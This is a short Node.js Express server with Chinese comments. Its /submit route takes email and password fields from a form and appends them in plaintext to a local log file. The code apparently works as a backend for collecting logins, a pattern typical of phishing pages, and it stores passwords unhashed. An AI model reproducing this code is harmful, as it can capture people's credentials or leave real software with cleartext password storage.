// server.js
const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public"))); // 提供 public 資料夾

// 接收表單資料
app.post("/submit", (req, res) => {
    const { email, password } = req.body;
    const content = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile("log.txt", content, (err) => {
        if (err) {
            console.error("寫入失敗", err);
            return res.status(500).send("伺服器錯誤");
        }
        res.send("已收到您填寫的資料，謝謝");
    });
});

// 啟動伺服器
app.listen(PORT, () => {
    console.log(`伺服器已啟動：http://localhost:${PORT}`);
});
